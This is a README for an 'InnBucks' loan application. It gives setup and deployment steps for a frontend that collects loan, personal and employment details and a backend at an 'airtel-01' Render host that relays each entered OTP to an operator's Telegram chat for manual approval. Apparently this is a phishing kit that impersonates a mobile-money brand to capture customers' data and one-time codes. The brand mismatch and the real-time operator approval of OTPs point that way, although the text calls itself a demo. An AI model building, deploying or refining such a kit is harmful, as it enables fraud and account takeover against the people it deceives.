# 🏦 InnBucks Loan Application

Full-stack loan application with OTP verification via Telegram bot integration.

**Live Demo**: [Deploy on Cloudflare Pages + Render]

---

## ✨ Features

- 📱 **Multi-step loan application** (7 steps)
- 💰 **Loan calculator** with real-time payment computation
- 🔐 **OTP verification** with Telegram bot admin approval
- 📧 **Data persistence** across steps using localStorage
- 🚀 **Production-ready** deployment on Render + Cloudflare Pages
- 📊 **No database required** (in-memory storage for demo)

---

## 🏗️ Architecture

```
Frontend (Cloudflare Pages)  Backend (Render)         Telegram Bot (Admin)
┌──────────────┐           ┌──────────────┐         ┌──────────────┐
│  index.html  │           │  Node.js     │         │  @BotFather  │
│  loan1-7.html│───POST──→ │  Express     │────────→│  Admin Chat  │
│  Loan App    │           │  Server      │         │  [✅] [❌]   │
│              │◄──Poll────│  OTP Storage │◄────────│  Approval    │
└──────────────┘           └──────────────┘         └──────────────┘
```

---

## 🚀 Quick Start

### 1. Local Development

**Backend:**

```bash
cd backend
npm install
cp .env.example .env
# Edit .env with Telegram credentials
npm start
# Runs on http://localhost:3000
```

**Frontend:**

```bash
# Open index.html in browser
# Or: python -m http.server 8000
```

### 2. Setup Telegram Bot

1. Message `@BotFather` on Telegram
2. Create new bot: `/newbot`
3. Get **Bot Token**: `123456:ABCxyz...`
4. Message your bot, then visit:
   ```
   https://api.telegram.org/bot{TOKEN}/getUpdates
   ```
5. Find and copy **Chat ID**: `987654321`

### 3. Configure Backend

Create `backend/.env`:

```env
TELEGRAM_BOT_TOKEN=123456789:ABCxyz
TELEGRAM_ADMIN_CHAT_ID=987654321
TELEGRAM_CALLBACK_TOKEN=secret_123
BACKEND_URL=http://localhost:3000
PORT=3000
```

### 4. Test Complete Flow

1. Open frontend (index.html)
2. Enter loan amount & click **APPLY NOW**
3. Fill all loan details → reach OTP page
4. Enter OTP (any 5 digits, e.g., `12345`)
5. Click **SUBMIT**
6. Check Telegram for approval request
7. Admin clicks **✅ APPROVE**
8. Frontend proceeds ✅

---

## 📦 What's Included

```
Frontend Files:
├── index.html           (Loan calculator homepage)
├── loan1.html           (Loan type & amount - Step 1)
├── loan2.html           (Personal details - Step 2)
├── loan3.html           (Employment info - Step 3)
├── loan4.html           (Confirmation - Step 4)
├── loan5.html           (OTP entry & submission - Step 5)
├── loan6.html           (Verification waiting - Step 6)
├── loan7.html           (Success screen - Step 7)
└── loan8.html           (Additional info - Step 8)

Backend:
├── server.js            (Main Express server)
├── package.json         (Dependencies)
└── .env.example         (Configuration template)

Documentation:
├── SETUP.md             (Local development & quick start)
├── DEPLOYMENT.md        (Production deployment guide)
└── .gitignore           (Git ignore rules)
```

---

## 🌐 Deployment

### Backend: Deploy on Render

1. Push to GitHub
2. Create **Web Service** on Render
3. Set environment variables
4. Deploy

Backend runs on: `https://airtel-01.onrender.com`

### Frontend: Deploy on Cloudflare Pages

1. Push to GitHub
2. Create **Pages project** on Cloudflare
3. Deploy

Frontend runs on: `https://your-project.pages.dev`

### Connect Frontend to Backend

Add to `index.html`:

```html
<script>
  localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
</script>
```

📖 **Detailed guide**: See [DEPLOYMENT.md](./DEPLOYMENT.md)

---

## 🔗 API Endpoints

### Backend API

| Endpoint                | Method | Purpose                      |
| ----------------------- | ------ | ---------------------------- |
| `/api/health`           | GET    | Health check                 |
| `/api/otp/submit`       | POST   | Submit OTP for verification  |
| `/api/otp/status/:id`   | GET    | Check OTP approval status    |
| `/api/telegram/approve` | POST   | Telegram callback (internal) |

See [backend/README.md](./backend/README.md) for details.

---

## 🔐 How OTP Verification Works

```
1. USER enters OTP on loan5.html
                ↓
2. Frontend sends POST /api/otp/submit to backend
                ↓
3. Backend stores OTP + sends Telegram notification to admin
                ↓
4. Frontend polls GET /api/otp/status every 2 seconds
                ↓
5. Admin sees approval request in Telegram with [✅] [❌] buttons
                ↓
6. Admin clicks ✅ APPROVE
                ↓
7. Backend updates request status to "approved"
                ↓
8. Frontend detects approval on next poll
                ↓
9. Redirects to loan7.html (next step) ✅
```

---

## 📊 Data Flow

```
Step 1-2: User enters loan & personal details
          ↓
          └─→ Stored in localStorage
              (persists across page refreshes)

Step 3: User enters employment & income info
          ↓
          └─→ Summary shown on Step 3

Step 5: User enters OTP
          ↓
          └─→ Sent to backend
              └─→ Telegram notified
                  └─→ Admin approves
                      └─→ Frontend proceeds ✅
```

---

## 🛠️ Tech Stack

| Component           | Technology                                    |
| ------------------- | --------------------------------------------- |
| **Frontend**        | HTML5, CSS3, JavaScript (Vanilla)             |
| **Backend**         | Node.js, Express.js                           |
| **Bot Integration** | Telegram Bot API                              |
| **Storage**         | LocalStorage (frontend), In-memory (backend)  |
| **Deployment**      | Render (backend), Cloudflare Pages (frontend) |

---

## 📝 Configuration

### Environment Variables (Backend)

See `backend/.env.example`:

```env
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_ADMIN_CHAT_ID=your_chat_id
TELEGRAM_CALLBACK_TOKEN=your_secret_key
BACKEND_URL=https://airtel-01.onrender.com  # use this when deploying
PORT=3000
```

### Frontend Configuration

Backend URL stored in localStorage:

```javascript
localStorage.getItem("backendUrl");
// Default: "https://airtel-01.onrender.com"
```

---

## ✅ Testing Checklist

- [ ] Backend starts without errors
- [ ] Telegram bot token is valid
- [ ] OTP submission sends data to backend
- [ ] Telegram receives approval request
- [ ] Admin can approve/reject via Telegram
- [ ] Frontend detects approval and proceeds
- [ ] All form data persists across steps
- [ ] Loading overlays display correctly
- [ ] No CORS errors in console
- [ ] Production deployment works end-to-end

---

## 🐛 Troubleshooting

**Issue**: "Backend URL incorrect"

```javascript
// Fix: Check localStorage
localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
```

**Issue**: "Telegram bot not sending messages"

```bash
# Check bot token and chat ID
curl "https://api.telegram.org/bot{TOKEN}/getMe"
```

**Issue**: "OTP stuck on verification"

- Check browser console for errors
- Verify backend is running
- Wait 30 seconds (Render free tier cold start)

---

## 📚 Documentation

- **Local Setup**: [SETUP.md](./SETUP.md)
- **Deployment**: [DEPLOYMENT.md](./DEPLOYMENT.md)
- **Backend API**: [backend/README.md](./backend/README.md)
- **Telegram Bot API**: https://core.telegram.org/bots/api

---

## 🎯 Next Features

- [ ] Database persistence (MongoDB)
- [ ] User login & password verification
- [ ] Email notifications
- [ ] SMS integration
- [ ] Admin dashboard
- [ ] Loan status tracking
- [ ] Document upload
- [ ] Payment integration

---

## 📄 License

MIT - Feel free to use for your project!

---

## 🤝 Support

Need help?

1. Check [SETUP.md](./SETUP.md) for local development
2. Read [DEPLOYMENT.md](./DEPLOYMENT.md) for production
3. Review [backend/README.md](./backend/README.md) for API details
4. Check browser console for errors
5. Review backend logs on Render dashboard

---

## 🚀 Ready to Deploy?

```bash
# 1. Push to GitHub
git push origin main

# 2. Deploy backend on Render
# (Connect GitHub repo)

# 3. Deploy frontend on Netlify
# (Connect GitHub repo)

# 4. Set environment variables on Render

# 5. Update backend URL in frontend

# 6. Test production deployment

# 🎉 You're live!
```

---

**Made with ❤️ for InnBucks**
